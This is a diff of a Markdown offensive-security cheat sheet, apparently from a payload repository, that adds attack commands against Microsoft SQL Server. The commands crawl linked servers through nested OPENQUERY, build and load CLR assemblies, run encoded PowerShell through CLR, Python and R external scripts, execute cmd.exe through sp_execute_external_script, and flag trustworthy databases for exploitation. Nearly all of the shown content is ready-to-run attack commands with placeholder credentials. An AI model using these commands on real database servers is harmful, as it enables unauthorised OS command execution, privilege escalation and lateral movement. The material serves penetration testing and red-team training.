@@ -163,12 +163,14 @@ A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results
 
 ```ps1
 Get-SQLInstanceDomain | Get-SQLServerLink -Verbose
+select * from master..sysservers
 ```
 
 ### Crawl Links for a Specific Instance
 
 ```ps1
 Get-SQLServerLinkCrawl -Instance "<DBSERVERNAME\DBInstance>" -Verbose
+select * from openquery("<instance>",'select * from openquery("<instance2>",''select * from master..sysservers'')')
 ```
 
 ### Query Version of Linked Database
@@ -286,12 +288,21 @@ Prerequisites:
 * CREATE ASSEMBLY permission (or)
 * ALTER ASSEMBLY permission (or)
 
+The execution takes place with privileges of the **service account**.
+
 ### Execute commands using CLR assembly
 
 ```ps1
+# Create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string
+Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir C:\Users\user\Desktop
+
+# Execute command using CLR assembly
+Invoke-SQLOSCmdCLR -Username sa -Password <password> -Instance <instance> -Command "whoami" -Verbose
 Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "whoami" Verbose
-or
 Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64>" -Verbose
+
+# List all the stored procedures added using CLR
+Get-SQLStoredProcedureCLR -Instance <instance> -Verbose
 ```
 
 ### Manually creating a CLR DLL and importing it
@@ -385,6 +396,7 @@ GO
 ## OLE Automation
 
 * :warning: Disabled by default
+* The execution takes place with privileges of the **service account**.
 
 ### Execute commands using OLE automation procedures
 
@@ -417,6 +429,9 @@ SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
 
 
 ## Agent Jobs
+
+* The execution takes place with privileges of the **SQL Server Agent service account** if a proxy account is not configured.
+* :warning: Require **sysadmin** or **SQLAgentUserRole**, **SQLAgentReaderRole**, and **SQLAgentOperatorRole** roles to create a job.
 
 ### Execute commands through SQL Agent Job service
 
@@ -461,12 +476,21 @@ RECONFIGURE;
 
 ```ps1
 Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64encodedscript>" -Verbose
+
+EXEC sp_execute_external_script @language =N'Python',@script=N'import subprocess p = subprocess.Popen("cmd.exe /c whoami", stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), "utf-8")])'
+WITH RESULT SETS (([cmd_out] nvarchar(max)))
 ```
 
 ## R
 
 ```ps1
 Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64encodedscript>" -Verbose
+
+EXEC sp_execute_external_script @language=N'R',@script=N'OutputDataSet <- data.frame(system("cmd.exe /c dir",intern=T))'
+WITH RESULT SETS (([cmd_out] text));
+GO
+
+@script=N'OutputDataSet <-data.frame(shell("dir",intern=T))'
 ```
 
 ## Audit Checks
@@ -491,8 +515,10 @@ powerpick Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "EXECUTE AS 
 
 ## Find databases that have been configured as trustworthy
 
-```ps1
+```sql
 Invoke-SQLAuditPrivTrustworthy -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose 
+
+SELECT name as database_name, SUSER_NAME(owner_sid) AS database_owner, is_trustworthy_on AS TRUSTWORTHY from sys.databases
 ```
 
 > The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound.
